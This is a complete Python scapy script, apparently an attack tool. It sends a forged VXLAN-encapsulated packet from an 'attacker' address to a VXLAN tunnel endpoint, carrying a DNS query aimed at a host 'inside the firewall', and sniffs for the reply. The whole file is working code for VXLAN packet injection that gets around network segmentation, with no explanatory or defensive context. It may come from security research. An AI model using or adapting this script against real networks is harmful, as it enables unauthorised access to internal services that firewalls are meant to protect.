#
# usage: python dns.py <domain>

###[ Loading modules ]###
import sys
import getopt
from scapy.all import PcapReader, wrpcap, Packet, NoPayload
from scapy.all import *
import threading
from threading import Thread
import time

vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
vtep="192.168.10.149"
attacker="172.20.10.10"
destination="10.0.0.11"
# port is the one we want to contact inside the firewall
insideport=53
# this port is a high port, just make this look like a normal request
testport=50408
lookup = sys.argv[1]



class myThread (threading.Thread):
   def __init__(self, testport1):
      threading.Thread.__init__(self)
      self.testport = testport1
   def run(self):
      sniff_dns_thread()


def custom_action(packet):
    global thepacket
    thepacket = str(packet)
    return

#GET Response Function
def sniff_dns_thread():
    sniff(filter = "udp and port " + str(testport), count = 1, prn= lambda x:x.summary())
    return

#start sniff thread
# Create new threads
thread1 = myThread(testport)

# Start new Threads
thread1.start()

time.sleep(1)

# sned dns request
send(IP(src=attacker,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
